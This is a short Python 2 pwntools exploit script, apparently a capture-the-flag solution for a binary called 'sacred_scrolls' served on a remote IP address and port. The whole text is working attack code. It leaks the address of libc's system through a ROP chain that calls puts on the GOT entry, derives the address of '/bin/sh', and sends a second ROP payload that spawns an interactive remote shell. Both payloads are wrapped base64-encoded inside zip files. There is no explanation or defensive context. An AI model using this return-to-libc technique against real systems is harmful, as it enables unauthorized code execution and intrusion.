#!/bin/python2
from pwn import *
import base64
from binascii import *
import os
import zipfile
def bb(b, z):
    try: os.remove("spell.txt")
    except: pass
    try: os.remove("spell.zip") 
    except: pass
    with open("spell.txt", "wb") as f: f.write(b)
    zf = zipfile.ZipFile(z, "w") ; zf.write("spell.txt") ; zf.close()
    with open(z, "r") as f: zipped_data = f.read()
    return base64.b64encode(zipped_data)

def pass_payload(p, payload):
    p.sendline("Aaa"); sleep(0.5) 
    p.sendline("1"); sleep(0.5)
    p.sendline(payload); sleep(0.5)
    p.sendline("2"); sleep(0.5)
    p.sendline("3"); sleep(0.5)

elf = ELF("sacred_scrolls")

en_tete = "\xf0\x9f\x91\x93\xe2\x9a\xa1\x00"+"aaaaaaaa"*4
pop_rdi_ret = 0x4011b3
ret = 0x4007ce

got_system = elf.got["system"]
puts_plt = elf.plt["puts"]
ret2main = elf.symbols["_start"]
payload1 = bb(en_tete+p64(pop_rdi_ret)+p64(got_system)+p64(puts_plt)+p64(ret2main),"aleph.zip")

p = remote("206.189.118.55", 30649)
pass_payload(p,payload1)
recv1 = p.recv()

leaked_system = u64(recv1[3525:3531]+"\x00\x00")
libc_system = leaked_system
libc_binsh = leaked_system + 1603896

payload2 = bb(en_tete + p64(ret) + p64(pop_rdi_ret)+p64(libc_binsh) + p64(libc_system), "beth.zip")
pass_payload(p, payload2)

p.interactive()
